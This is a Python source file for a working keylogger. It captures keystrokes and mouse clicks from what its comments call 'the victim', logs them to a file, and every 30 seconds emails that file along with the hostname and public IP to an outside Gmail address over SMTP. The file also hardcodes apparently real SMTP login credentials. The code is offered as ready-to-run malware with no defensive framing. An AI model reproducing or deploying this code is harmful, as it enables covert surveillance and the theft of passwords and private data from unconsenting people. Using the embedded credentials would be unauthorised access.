import logging
import smtplib
import socket
import requests
import threading
import time
from datetime import date
from pynput.keyboard import Key, Listener
from pynput.mouse import Listener as MouseListener
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

class Keylogger:

    HOST = socket.gethostname()
    FILENAME = "log_"+date.today().strftime("%d_%m_%Y")+".txt"
    TIMER = 30

    def __init__(self, log_file=FILENAME):
        self.log_file = log_file
        self.text = ""
        self.setup_logging()

    """
    Set record format
    """
    def setup_logging(self):
        logging.basicConfig(filename=self.log_file, level=logging.DEBUG, format="%(asctime)s - %(message)s")

    """
    Detect when the victim clicks
    """
    def on_click(self, x, y, button, pressed):
        if pressed:
            self.add_text()

    """
    Detect when the victim presses a key
    """
    def on_press(self, key):
        if key == Key.enter:
            self.add_text()
        else:
            if len(str(key).split(".")) <= 1:
                self.text += str(key)
            else:
                self.text += ""

    """
    Add the text to the file
    """
    def add_text(self):
        if self.text != "":
             clean_text = self.text.replace("'", "")
             print(clean_text)
             logging.info(clean_text)
             self.text = ""

    """
    Sends the file by email
    """
    def send_email(self):
        # Configure sender and recipient data
        sender = "notreply@premioslasilla.do"
        recipient = "inglrcruz@gmail.com"

        # Configure SMTP server and credentials
        smtp_server = "mail.premioslasilla.do"
        smtp_port = 587
        username = "notreply@premioslasilla.do"
        password = "Ft39HuIhi=[6"

        # Create a MIMEMultipart object for the email
        message = MIMEMultipart()

        # Configure email details
        message["From"] = sender
        message["To"] = recipient
        message["Subject"] = "Keylogger File ("+self.HOST+")"

        # Add the message body
        body_message = 'IP: '+str(self.get_public_ip())
        message.attach(MIMEText(body_message, "plain"))

        # Add the attachment file
        with open(self.FILENAME, "rb") as file:
            attachment = MIMEBase("application", "octet-stream")
            attachment.set_payload(file.read())

        encoders.encode_base64(attachment)
        attachment.add_header("Content-Disposition", f"attachment; filename= {self.FILENAME}")
        message.attach(attachment)

        # Establish connection with SMTP server
        server = smtplib.SMTP(smtp_server, smtp_port)
        server.starttls()
        server.login(username, password)

        # Send the email
        server.send_message(message)

        # Close the connection with the SMTP server
        server.quit()

    """
    Returns the public IP of the victim
    """
    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org?format=json')
            data = response.json()
            ip_address = data['ip']
            return ip_address
        except requests.RequestException:
            return None

    """
    Timer to mail the file every x time
    """
    def timer(self):
        while True:
            time.sleep(self.TIMER)
            self.send_email()


    def start(self):
        threading.Thread(target=logger.timer).start()
        keyboard_listener = Listener(on_press=self.on_press)
        mouse_listener = MouseListener(on_click=self.on_click)
        keyboard_listener.start()
        mouse_listener.start()
        keyboard_listener.join()
        mouse_listener.join()

logger = Keylogger()
logger.start()